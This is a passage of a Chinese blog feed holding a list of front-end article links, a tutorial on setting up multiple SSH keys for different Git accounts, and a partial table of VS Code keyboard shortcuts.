href="https://juejin.im/post/5c21b584e51d4548ac6f6c99" target="_blank" rel="noopener">深入 Babel，这一篇就够了</a></li><li><a href="https://juejin.im/post/5b4b73e7f265da0f96287f0a" target="_blank" rel="noopener">[浅析]特定场景下取代 if-else 和 switch 的方案</a></li><li><a href="https://juejin.im/post/5b0c3b53f265da09253cbed0" target="_blank" rel="noopener">懒加载和预加载</a></li><li><a href="https://juejin.im/post/5aed6da16fb9a07aac2457f6" target="_blank" rel="noopener">如何判断用户浏览器以及一些前端常用的正则表单验证</a></li><li><a href="https://juejin.im/post/5c136bd16fb9a049d37efc47" target="_blank" rel="noopener">前端缓存最佳实践</a></li><li><a href="https://juejin.im/post/5a12881a6fb9a044fd115dd4" target="_blank" rel="noopener">浅谈前端线上部署与运维</a></li><li><a href="https://juejin.im/post/5a0b29756fb9a045167cb643" target="_blank" rel="noopener">别再拿奇技淫巧搬砖了</a></li><li><a href="https://juejin.im/post/5bee7dd4e51d451f5b54cbb4" target="_blank" rel="noopener">前端黑科技：美团网页首帧优化实践</a></li><li><a href="https://juejin.im/post/5c99c17df265da6129788ae2" target="_blank" rel="noopener">技术栈：小菜前端的技术栈是如何规划和演进的</a></li><li><a href="https://juejin.im/post/5d37d982e51d45108c59a635" target="_blank" rel="noopener">【中高级前端必备】手摸手教你撸一个脚手架</a></li><li><a href="https://juejin.im/post/5b626a096fb9a04fdd7d7433" target="_blank" rel="noopener">单枪匹马撸个聊天室, 支持 Web/Android/iOS 三端</a></li><li><a href="https://juejin.im/post/59c4c9d85188254f58412d17" target="_blank" rel="noopener">移动 Web 开发问题和优化小结</a></li><li><a href="https://juejin.im/post/5d1c6550518825330a3bfa01" target="_blank" rel="noopener">前端团队代码评审 CheckList 清单</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FC6HrDJnQivNMIBz5jjcm6g" target="_blank" rel="noopener">前端工程师必备十大网站</a></li><li><a href="https://juejin.im/post/59dad63ff265da065270d49e" target="_blank" rel="noopener">实践中的前后端分离</a></li><li><a href="https://juejin.im/post/5a52f138f265da3e5b32a41b" target="_blank" rel="noopener">把前端监控做到极致</a></li><li><a href="https://juejin.im/post/5a9759a16fb9a0635b5360b3" target="_blank" rel="noopener">手把手教你如何编写一个前端图片压缩、方向纠正、预览、上传插件</a></li><li><a href="https://juejin.im/post/5a8d720a5188257a67177c3c" target="_blank" rel="noopener">程序员的小浪漫—-烟火</a></li><li><a href="https://juejin.im/post/59e5a86c51882578bf185dba" target="_blank" rel="noopener">无头浏览器 Puppeteer 初探</a></li><li><a href="https://juejin.im/post/5b50c8b76fb9a04fd3439215" target="_blank" rel="noopener">优雅的类写法</a></li><li><a href="https://juejin.im/post/59c4d696f265da065d2b7843" target="_blank" rel="noopener">网易严选 App 感受 Weex 开发（已完结）</a></li><li><a href="https://juejin.im/post/5b10dd36e51d4506e04cf802" target="_blank" rel="noopener">深入框架本源系列 —— Virtual Dom</a></li><li><a href="https://juejin.im/post/5a372716518825258a5fbc80" target="_blank" rel="noopener">搭建一个前端监控系统,不再错过 BUG</a></li><li><a href="https://juejin.im/post/5a6c87c46fb9a01ca560b4d7" target="_blank" rel="noopener">缓存详解</a></li><li><a href="https://juejin.im/post/5d1fe6be51882579db031a6d" target="_blank" rel="noopener">从头开始，彻底理解服务端渲染原理(8 千字汇总长文)</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000012578794" target="_blank" rel="noopener">很全很全的前端本地存储讲解</a></li><li><a href="https://juejin.im/post/5b09a641f265da0dcd0b674f" target="_blank" rel="noopener">新一代的前端存储方案–indexedDB</a></li><li><a href="https://juejin.im/post/5bf174396fb9a049ca36f13d" target="_blank" rel="noopener">正则表达式详解及实战</a></li><li><a href="https://juejin.im/post/5b8bf7e3e51d4538c210c6b0" target="_blank" rel="noopener">如何实现前端录音功能</a></li><li><a href="https://link.juejin.im/?target=http%3A%2F%2Fhpoenixf.com%2F%E5%89%8D%E7%AB%AF%E8%BF%9B%E9%98%B6%E7%B3%BB%E5%88%97-%E7%9B%AE%E5%BD%95.html" target="_blank" rel="noopener">前端进阶系列-目录</a></li><li><a href="https://juejin.im/post/5c09a80151882521c81168a2" target="_blank" rel="noopener">【译】你不知道的 Chrome 调试工具技巧 第一天：console 中的 ‘$’</a></li><li><a href="https://juejin.im/post/5c0d2622e51d4529ee234272" target="_blank" rel="noopener">ECharts 打造在线个人简历</a></li><li><a href="https://juejin.im/post/5b62d68df265da0f9d1a1cd6" target="_blank" rel="noopener">前端监控和前端埋点方案设计</a></li><li><a href="https://juejin.im/post/5b729909e51d45662434aef0" target="_blank" rel="noopener">开源库架构实战——从 0 到 1 搭建属于你自己的开源库</a></li><li><a href="https://juejin.im/post/5d24096ee51d454d1d6285a1" target="_blank" rel="noopener">有赞前端质量保障体系</a></li><li><a href="https://juejin.im/post/5a474c8ff265da430a50ea57" target="_blank" rel="noopener">未来的前端工程师</a></li><li><a href="https://juejin.im/post/5a069b6d51882509e5432656" target="_blank" rel="noopener">一篇文章带你熟悉 TCP/IP 协议（网络协议篇二）</a></li><li><a href="https://juejin.im/post/5afd6a88f265da0b9127a879" target="_blank" rel="noopener">优化页面的打开速度，要不要了解一下~</a></li><li><a href="https://juejin.im/post/5a5b2a5c6fb9a01cbc6e59f9" target="_blank" rel="noopener">重构 - 代码整洁之道</a></li><li><a href="https://juejin.im/post/5c811e426fb9a04a0c2f3bdb" target="_blank" rel="noopener">我在淘宝做前端的这三年 — 第三年</a></li><li><a href="https://juejin.im/post/5a5e28b2f265da3e355b1451" target="_blank" rel="noopener">2018 Web 开发者最佳学习路线</a></li><li><a href="https://juejin.im/post/5cfe4e8a6fb9a07ec63b09a4" target="_blank" rel="noopener">富文本原理了解一下？</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fjeffjade.com%2F2017%2F12%2F17%2F134-kinds-of-toss-using-puppeteer%2F" target="_blank" rel="noopener">大前端神器安利之 Puppeteer</a></li><li><a href="https://juejin.im/post/5b890c386fb9a019c771713a" target="_blank" rel="noopener">少侠，留步，图片预览术</a></li><li><a href="https://juejin.im/post/5a9923e9518825558251c96a" target="_blank" rel="noopener">浏览器的回流与重绘 (Reflow &amp; Repaint)</a></li><li><a href="https://juejin.im/post/5a97bb3951882555867ecffc" target="_blank" rel="noopener">用 Canvas 画一只会跟着鼠标走的小狗</a></li><li><a href="https://link.juejin.im/?target=http%3A%2F%2Fjspang.com%2F2017%2F11%2F13%2Fkoa2%2F" target="_blank" rel="noopener">前端挑战全栈 13 集原创 Koa2.x 免费视频奉上</a></li><li><a href="https://juejin.im/post/5b0cf331f265da0905017b48" target="_blank" rel="noopener">学习笔记——正则匹配方法整理</a></li><li><a href="https://juejin.im/post/59ed37f5f265da431e15eaac" target="_blank" rel="noopener">HTML5 桌面通知：Notification API</a></li><li><a href="https://juejin.im/post/5a5380a6518825733365e62a" target="_blank" rel="noopener">前后端分离实践有感</a></li><li><a href="https://juejin.im/post/5b762bace51d45556f41c431" target="_blank" rel="noopener">写给工程师的十条精进原则</a></li><li><a href="https://juejin.im/post/5bbc1b0c6fb9a05cf230140c" target="_blank" rel="noopener">优秀前端必知的话题：我们应该做些力所能及的优化</a></li><li><a href="https://juejin.im/post/5b7e74ce51882542a92ba0e9" target="_blank" rel="noopener">动画道路上的新宠 – Lottie</a></li><li><a href="https://juejin.im/post/5bad9140e51d450e935c6d64" target="_blank" rel="noopener">前端安全系列（一）：如何防止 XSS 攻击？</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fcalpa.me%2F2018%2F11%2F05%2Ffront-end-daily-improving-learning-list%3Futm_source%3Djuejin" target="_blank" rel="noopener">前端工程师的日常修炼清单</a></li><li><a href="https://juejin.im/post/5c178aaaf265da6147702108" target="_blank" rel="noopener">前端埋点统计方案思考</a></li><li><a href="https://juejin.im/post/5b1d5b3951882513e83b8c78" target="_blank" rel="noopener">重构 - 用各种方式优化自己的函数库</a></li><li><a href="https://juejin.im/post/5d1178c3e51d45108223fc92" target="_blank" rel="noopener">这个前端写的免费 Web 版 PS，让他三十岁前财务自由</a></li><li><a href="https://juejin.im/post/5b3731b36fb9a00e5326f087" target="_blank" rel="noopener">[译文] 初学者应该了解的数据结构：Array、HashMap 与 List</a></li><li><a href="https://juejin.im/post/5c19c5e0e51d4502a232c1c6" target="_blank" rel="noopener">一口(很长的)气了解 babel</a></li><li><a href="https://juejin.im/post/5b921b415188255c9031b0c3" target="_blank" rel="noopener">用微前端的方式搭建类单页应用</a></li><li><a href="https://juejin.im/post/5a20fe96f265da431120025b" target="_blank" rel="noopener">一个炫酷大屏展示页的打造过程</a></li><li><a href="https://juejin.im/post/5b20758d5188257d555c5c34" target="_blank" rel="noopener">聊天系统很复杂？前端工程师也能完成！</a></li><li><a href="https://juejin.im/post/5cae9de95188251ae2324ec3" target="_blank" rel="noopener">前端想要了解的 Nginx</a></li><li><a href="https://juejin.im/post/5bc823d46fb9a05d1d2e3fc9" target="_blank" rel="noopener">腾讯发布前端组件框架 Omi，全面拥抱 Web Components</a></li><li><a href="https://juejin.im/post/5ac43e7c6fb9a028d1414f84" target="_blank" rel="noopener">前端常见问题整理</a></li><li><a href="https://juejin.im/post/5ca0c0abe51d4553a942c17d" target="_blank" rel="noopener">你不知道的浏览器页面渲染机制</a></li><li><a href="https://juejin.im/post/5c9ac607f265da6103588b31" target="_blank" rel="noopener">全面分析前端的网络请求方式</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Faotu.io%2Fnotes%2F2018%2F06%2F07%2FTaro%2F" target="_blank" rel="noopener">多端统一开发框架 - Taro</a></li><li><a href="https://juejin.im/post/5c860282e51d45531330e10e" target="_blank" rel="noopener">让你的网页更丝滑（一）</a></li><li><a href="https://juejin.im/post/5aae8b4f5188255588052ffb" target="_blank" rel="noopener">大道至简–API 设计的美学</a></li><li><a href="https://juejin.im/post/5a9e8ad5f265da23a40456d4" target="_blank" rel="noopener">什么是 PWA</a></li><li><a href="https://juejin.im/post/5b4160f4f265da0f83646849" target="_blank" rel="noopener">接口咋整？前端数据药神来也</a></li><li><a href="https://juejin.im/post/5a2bc28f6fb9a044fe464b19" target="_blank" rel="noopener">学习 Less-看这篇就够了</a></li><li><a href="https://juejin.im/post/5ad04d20f265da238440feb9" target="_blank" rel="noopener">前端必会的抓包工具</a></li><li><a href="https://juejin.im/post/5ae56927f265da0b7e0c0968" target="_blank" rel="noopener">前端将数据转化为弹幕效果的实现方式</a></li><li><a href="https://juejin.im/post/5cb9e563f265da03712999e8" target="_blank" rel="noopener">[前端漫谈_5] 从 IIFE 聊到 Babel 带你深入了解前端模块化发展体系</a></li><li><a href="https://juejin.im/post/5ce6b9c9f265da1b7b31637c" target="_blank" rel="noopener">【前端词典】如何向老板解释反向代理</a></li><li><a href="https://juejin.im/post/5bd2f19051882526d14975d2" target="_blank" rel="noopener">厌倦了写活动页？快来撸一个页面生成器吧！</a></li><li><a href="https://juejin.im/post/5c06a3b35188257f30199529" target="_blank" rel="noopener">2019 年如何打造自己的“前端品牌”</a></li><li><a href="https://juejin.im/post/59dc2b7a6fb9a0451869ae3a" target="_blank" rel="noopener">前端安全知识</a></li><li><a href="https://juejin.im/post/5abc4c0d6fb9a028d3757884" target="_blank" rel="noopener">如何写一个高逼格 README</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>本地配置多个ssh-key</title>
      <link href="2019/09/11/ssh-key/"/>
      <url>2019/09/11/ssh-key/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有时我们在开发的过程中，需要把代码提交到不同的gitlab仓库里面，比如：公司的gitlab、GitHub等其他git仓库；在代码提交的时候都需要验证本机的SSH Keys；</p><p>在使用  ssh-keygen -t rsa -C “<a href="mailto:youremal@emal.com" target="_blank" rel="noopener">youremal@emal.com</a>“这个命令是默认都是生成到<del>/.ssh/id_rsa和</del>/.ssh/id_rsa.pub里面，如果已存在会覆盖的；</p><p>那么如果是本地有多个SSH Keys呢？</p><h2 id="添加ssh-key"><a href="#添加ssh-key" class="headerlink" title="添加ssh key"></a>添加ssh key</h2><p>如果你有多个gitlab账号  </p><p>执行命令</p><pre class="line-numbers language-js"><code class="language-js"> ssh<span class="token operator">-</span>keygen <span class="token operator">-</span>t rsa <span class="token operator">-</span>C <span class="token string">"emal1@163.com"</span> <span class="token comment" spellcheck="true">//这个邮箱一定要是你对应的gitlab绑定的邮箱</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行是会出现以下询问：</p><pre class="line-numbers language-js"><code class="language-js">Generating <span class="token keyword">public</span><span class="token operator">/</span><span class="token keyword">private</span> rsa key pair<span class="token punctuation">.</span><span class="token comment" spellcheck="true">//默认的输出文件就是根目录下的.ssh/id_rsa 你需要重新指定一个文件名 </span><span class="token comment" spellcheck="true">//如：.ssh/id_rsa_emal1 文件名如何定义自行决定</span>Enter file <span class="token keyword">in</span> which to save the key <span class="token punctuation">(</span><span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_emal1<span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_58 already exists<span class="token punctuation">.</span><span class="token comment" spellcheck="true">//已存在是否覆盖</span>Overwrite <span class="token punctuation">(</span>y<span class="token operator">/</span>n<span class="token punctuation">)</span><span class="token operator">?</span> y<span class="token comment" spellcheck="true">//设置密码 可直接跳过</span>Enter passphrase <span class="token punctuation">(</span>empty <span class="token keyword">for</span> no passphrase<span class="token punctuation">)</span><span class="token punctuation">:</span> Enter same passphrase again<span class="token punctuation">:</span> Your identification has been saved <span class="token keyword">in</span> <span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_emal1<span class="token punctuation">.</span>Your <span class="token keyword">public</span> key has been saved <span class="token keyword">in</span> <span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_emal1<span class="token punctuation">.</span>pub<span class="token punctuation">.</span>The key fingerprint is<span class="token punctuation">:</span>SHA256<span class="token punctuation">:</span>aNZ0rCQP3xI1jmcvv9H9GKDjuRhE6VMVcLDeLKi53dE emal1@<span class="token number">163</span><span class="token punctuation">.</span>comThe key's randomart image is<span class="token punctuation">:</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">[</span>RSA <span class="token number">2048</span><span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span class="token operator">|</span>          <span class="token operator">=</span>o<span class="token operator">+</span><span class="token punctuation">.</span>   <span class="token operator">|</span><span class="token operator">|</span>         <span class="token operator">*</span> <span class="token operator">=</span>     <span class="token operator">|</span><span class="token operator">|</span>      o B O      <span class="token operator">|</span><span class="token operator">|</span>       <span class="token operator">%</span> @ <span class="token operator">+</span>     <span class="token operator">|</span><span class="token operator">|</span>      <span class="token operator">+</span> S <span class="token operator">=</span> <span class="token operator">=</span>    <span class="token operator">|</span><span class="token operator">|</span>     o <span class="token operator">+</span> o <span class="token operator">*</span> o <span class="token punctuation">.</span> <span class="token operator">|</span><span class="token operator">|</span>      o <span class="token punctuation">.</span> <span class="token operator">+</span> E o <span class="token punctuation">.</span><span class="token operator">|</span><span class="token operator">|</span>       o <span class="token operator">=</span> <span class="token operator">+</span> o o<span class="token punctuation">.</span><span class="token operator">|</span><span class="token operator">|</span>      <span class="token punctuation">.</span> o <span class="token operator">=</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">.</span> <span class="token punctuation">.</span><span class="token operator">|</span><span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">[</span>SHA256<span class="token punctuation">]</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接vim或者cat输出pub公钥文件：</p><pre class="line-numbers language-js"><code class="language-js">cat <span class="token operator">/</span>Users<span class="token regex">/a58/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_emal1<span class="token punctuation">.</span>pub         ssh<span class="token operator">-</span>rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC12HyuAvMnRzQK24SXtJF7v5BL3lsH6ab1<span class="token operator">/</span>NzYO<span class="token operator">/</span>Q7whOTndqsS59<span class="token operator">/</span>ZCqK<span class="token operator">/</span>HK5TiwJkoEH<span class="token operator">+</span>l2tB9o8a<span class="token operator">+</span>1De5ri<span class="token operator">/</span>9a7zLVIEST<span class="token operator">/</span>ig79LiCcoIengSLX8jX37dq6pchBfKSdukXBsGJnrxKVsnVZScY5Bozx8LlhPYOuFuxZ8yW<span class="token operator">/</span>2nxVAVaa1aIa8W4ZDA3rxBsdClh5GjT8dWHvfZtb8w8bFdjKSywvf4<span class="token operator">+</span>GeIW0gjrRgmpkRmwaiCRam2dmnOS0vWNy<span class="token operator">+</span>ZhkIeiMR0DqSpbT5Zeb81NVuvN3oXAornUR5GjN5wyKR2UsXLIJ4TvccYS<span class="token operator">+</span>8EOKItM1FBX3oyGeQHO8qeWL emal1@<span class="token number">163</span><span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拷贝文件里面的内容添加到你对应的gitlab的ssh keys里面</p><h2 id="配置config"><a href="#配置config" class="headerlink" title="配置config"></a>配置config</h2><p>在你本地的~/.ssh/ 下面新建config文件 文件里面添加如下内容</p><pre class="line-numbers language-js"><code class="language-js"># emal1 gitlab# 添加你Git仓库地址的域名 如：githubHost emal1<span class="token punctuation">.</span>gitlab<span class="token punctuation">.</span>com#填写你gitlab绑定的邮箱User emal1@<span class="token number">163</span><span class="token punctuation">.</span>comPreferredAuthentications publickey#对应你刚刚生成的公钥文件IdentityFile <span class="token operator">~</span><span class="token operator">/</span><span class="token punctuation">.</span>ssh<span class="token operator">/</span>id_rsa_emal1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> OK以上你都完成了之后那边也就完成了git的提交的配置了。</p>]]></content>
      
      
      <categories>
          
          <category> ssh </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> ssh </tag>
            
            <tag> ssh-key </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vscode前端开发插件大全</title>
      <link href="2019/09/11/vscode/"/>
      <url>2019/09/11/vscode/</url>
      
        <content type="html"><![CDATA[<h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><h3 id="通用快捷键"><a href="#通用快捷键" class="headerlink" title="通用快捷键"></a>通用快捷键</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl+Shift+P,F1</td><td align="left">展示全局命令面板</td></tr><tr><td align="left">Ctrl+P</td><td align="left">快速打开最近打开的文件</td></tr><tr><td align="left">Ctrl+Shift+N</td><td align="left">打开新的编辑器窗口</td></tr><tr><td align="left">Ctrl+Shift+W</td><td align="left">关闭编辑器</td></tr></tbody></table><h3 id="基础编辑"><a href="#基础编辑" class="headerlink" title="基础编辑"></a>基础编辑</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + X</td><td align="left">剪切</td></tr><tr><td align="left">Ctrl + C</td><td align="left">复制</td></tr><tr><td align="left">Alt + up/down</td><td align="left">移动行上下</td></tr><tr><td align="left">Shift + Alt up/down</td><td align="left">在当前行上下复制当前行</td></tr><tr><td align="left">Ctrl + Shift + K</td><td align="left">删除行</td></tr><tr><td align="left">Ctrl + Enter</td><td align="left">在当前行下插入新的一行</td></tr><tr><td align="left">Ctrl + Shift + Enter</td><td align="left">在当前行上插入新的一行</td></tr><tr><td align="left">Ctrl + Shift + | 匹配花括号的闭合处，跳转</td><td align="left"></td></tr><tr><td align="left">Ctrl + ] / [</td><td align="left">行缩进</td></tr><tr><td align="left">Home</td><td align="left">光标跳转到行头</td></tr><tr><td align="left">End</td><td align="left">光标跳转到行尾</td></tr><tr><td align="left">Ctrl + Home</td><td align="left">跳转到页头</td></tr><tr><td align="left">Ctrl + End</td><td align="left">跳转到页尾</td></tr><tr><td align="left">Ctrl + up/down</td><td align="left">行视图上下偏移</td></tr><tr><td align="left">Alt + PgUp/PgDown</td><td align="left">屏视图上下偏移</td></tr><tr><td align="left">Ctrl + Shift + [</td><td align="left">折叠区域代码</td></tr><tr><td align="left">Ctrl + Shift + ]</td><td align="left">展开区域代码</td></tr><tr><td align="left">Ctrl + K Ctrl + [</td><td align="left">折叠所有子区域代码</td></tr><tr><td align="left">Ctrl + k Ctrl + ]</td><td align="left">展开所有折叠的子区域代码</td></tr><tr><td align="left">Ctrl + K Ctrl + 0</td><td align="left">折叠所有区域代码</td></tr><tr><td align="left">Ctrl + K Ctrl + J</td><td align="left">展开所有折叠区域代码</td></tr><tr><td align="left">Ctrl + K Ctrl + C</td><td align="left">添加行注释</td></tr><tr><td align="left">Ctrl + K Ctrl + U</td><td align="left">删除行注释</td></tr><tr><td align="left">Ctrl + /</td><td align="left">添加关闭行注释</td></tr><tr><td align="left">Shift + Alt +A</td><td align="left">块区域注释</td></tr><tr><td align="left">Alt + Z</td><td align="left">添加关闭词汇包含</td></tr></tbody></table><h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + T</td><td align="left">列出所有符号</td></tr><tr><td align="left">Ctrl + G</td><td align="left">跳转行</td></tr><tr><td align="left">Ctrl + P</td><td align="left">跳转文件</td></tr><tr><td align="left">Ctrl + Shift + O</td><td align="left">跳转到符号处</td></tr><tr><td align="left">Ctrl + Shift + M</td><td align="left">打开问题展示面板</td></tr><tr><td align="left">F8</td><td align="left">跳转到下一个错误或者警告</td></tr><tr><td align="left">Shift + F8</td><td align="left">跳转到上一个错误或者警告</td></tr><tr><td align="left">Ctrl + Shift + Tab</td><td align="left">切换到最近打开的文件</td></tr><tr><td align="left">Alt + left / right</td><td align="left">向后、向前</td></tr><tr><td align="left">Ctrl + M</td><td align="left">进入用Tab来移动焦点</td></tr></tbody></table><h3 id="查询与替换"><a href="#查询与替换" class="headerlink" title="查询与替换"></a>查询与替换</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + F</td><td align="left">查询</td></tr><tr><td align="left">Ctrl + H</td><td align="left">替换</td></tr><tr><td align="left">F3 / Shift + F3</td><td align="left">查询下一个/上一个</td></tr><tr><td align="left">Alt + Enter</td><td align="left">选中所有出现在查询中的</td></tr><tr><td align="left">Ctrl + D</td><td align="left">匹配当前选中的词汇或者行，再次选中-可操作</td></tr><tr><td align="left">Ctrl + K Ctrl + D</td><td align="left">移动当前选择到下个匹配选择的位置(光标选定)</td></tr><tr><td align="left">Alt + C / R / W</td><td align="left"></td></tr></tbody></table><h3 id="多行光标操作于选择"><a href="#多行光标操作于选择" class="headerlink" title="多行光标操作于选择"></a>多行光标操作于选择</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Alt + Click</td><td align="left">插入光标-支持多个</td></tr><tr><td align="left">Ctrl + Alt + up/down</td><td align="left">上下插入光标-支持多个</td></tr><tr><td align="left">Ctrl + U</td><td align="left">撤销最后一次光标操作</td></tr><tr><td align="left">Shift + Alt + I</td><td align="left">插入光标到选中范围内所有行结束符</td></tr><tr><td align="left">Ctrl + I</td><td align="left">选中当前行</td></tr><tr><td align="left">Ctrl + Shift + L</td><td align="left">选择所有出现在当前选中的行-操作</td></tr><tr><td align="left">Ctrl + F2</td><td align="left">选择所有出现在当前选中的词汇-操作</td></tr><tr><td align="left">Shift + Alt + right</td><td align="left">从光标处扩展选中全行</td></tr><tr><td align="left">Shift + Alt + left</td><td align="left">收缩选择区域</td></tr><tr><td align="left">Shift + Alt + (drag mouse)</td><td align="left">鼠标拖动区域，同时在多个行结束符插入光标</td></tr><tr><td align="left">Ctrl + Shift + Alt + (Arrow Key)</td><td align="left">也是插入多行光标的[方向键控制]</td></tr><tr><td align="left">Ctrl + Shift + Alt + PgUp/PgDown</td><td align="left">也是插入多行光标的[整屏生效]</td></tr></tbody></table><h3 id="丰富的语言操作"><a href="#丰富的语言操作" class="headerlink" title="丰富的语言操作"></a>丰富的语言操作</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + Space</td><td align="left">输入建议[智能提示]</td></tr><tr><td align="left">Ctrl + Shift + Space</td><td align="left">参数提示</td></tr><tr><td align="left">Tab</td><td align="left">Emmet指令触发/缩进</td></tr><tr><td align="left">Shift + Alt + F</td><td align="left">格式化代码</td></tr><tr><td align="left">Ctrl + K Ctrl + F</td><td align="left">格式化选中部分的代码</td></tr><tr><td align="left">F12</td><td align="left">跳转到定义处</td></tr><tr><td align="left">Alt + F12</td><td align="left">代码片段显示定义</td></tr><tr><td align="left">Ctrl + K F12</td><td align="left">在其他窗口打开定义处</td></tr><tr><td align="left">Ctrl + .</td><td align="left">快速修复部分可以修复的语法错误</td></tr><tr><td align="left">Shift + F12</td><td align="left">显示所有引用</td></tr><tr><td align="left">F2</td><td align="left">重命名符号</td></tr><tr><td align="left">Ctrl + Shift + . / ,</td><td align="left">替换下个值</td></tr><tr><td align="left">Ctrl + K Ctrl + X</td><td align="left">移除空白字符</td></tr><tr><td align="left">Ctrl + K M</td><td align="left">更改页面文档格式</td></tr></tbody></table><h3 id="编辑器管理"><a href="#编辑器管理" class="headerlink" title="编辑器管理"></a>编辑器管理</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + F4, Ctrl + W</td><td align="left">关闭编辑器</td></tr><tr><td align="left">Ctrl + k F</td><td align="left">关闭当前打开的文件夹</td></tr><tr><td align="left">Ctrl + |切割编辑窗口</td><td align="left"></td></tr><tr><td align="left">Ctrl + 1/2/3</td><td align="left">切换焦点在不同的切割窗口</td></tr><tr><td align="left">Ctrl + K Ctrl &lt;-/-&gt;</td><td align="left">切换焦点在不同的切割窗口</td></tr><tr><td align="left">Ctrl + Shift + PgUp/PgDown</td><td align="left">切换标签页的位置</td></tr><tr><td align="left">Ctrl + K &lt;-/-&gt;</td><td align="left">切割窗口位置调换</td></tr></tbody></table><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">Ctrl + N</td><td align="left">新建文件</td></tr><tr><td align="left">Ctrl + O</td><td align="left">打开文件</td></tr><tr><td align="left">Ctrl + S</td><td align="left">保存文件</td></tr><tr><td align="left">Ctrl + Shift + S</td><td align="left">另存为</td></tr><tr><td align="left">Ctrl + K S</td><td align="left">保存所有当前已经打开的文件</td></tr><tr><td align="left">Ctrl + F4</td><td align="left">关闭当前编辑窗口</td></tr><tr><td align="left">Ctrl + K Ctrl + W</td><td align="left">关闭所有编辑窗口</td></tr><tr><td align="left">Ctrl + Shift + T</td><td align="left">撤销最近关闭的一个文件编辑窗口</td></tr><tr><td align="left">Ctrl + K Enter</td><td align="left">保持开启</td></tr><tr><td align="left">Ctrl + Shift + Tab</td><td align="left">调出最近打开的文件列表，重复按会切换</td></tr><tr><td align="left">Ctrl + Tab</td><td align="left">与上面一致，顺序不一致</td></tr><tr><td align="left">Ctrl + K P</td><td align="left">复制当前打开文件的存放路径</td></tr><tr><td align="left">Ctrl + K R</td><td align="left">打开当前编辑文件存放位置【文件管理器】</td></tr><tr><td align="left">Ctrl + K O</td><td align="left">在新的编辑器中打开当前编辑的文件</td></tr></tbody></table><h3 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h3><table><thead><tr><th align="left">快捷键</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">F11</td><td align="left">切换全屏模式</td></tr><tr><td align="left">Shift + Alt + 1</td><td align="left">切换编辑布局【目前无效】</td></tr><tr><td align="left">Ctrl + =/-</td><td align="left">放大 / 缩小</td></tr><tr><td align="left">Ctrl + B</td><td align="left">侧边栏显示隐藏</td></tr><tr><td align="left">Ctrl + Shift + E</td><td align="left">资源视图和编辑视图的焦点切换</td></tr><tr><td align="left">Ctrl + Shift + F</td><td align="left">打开全局搜索</td></tr><tr><td align="left">Ctrl + Shift + G</td><td align="left">打开Git可视管理</td></tr><tr><td align="left">Ctrl + Shift + D</td><td align="left">打开DeBug面板</td></tr><tr><td align="left">Ctrl + Shift + X</td><td align="left">打开插件市场面板</td></tr><tr><td align="left">Ctrl + Shift + H</td><td align="left">在当前文件替换查询替换</td></tr><tr><td align="left">Ctrl + Shift + J</td><td align="left">开启详细查询</td></tr><tr><td align="left">Ctrl + Shift + V</td><td align="left">预览Markdown文件【编译后】</td></tr><tr><td 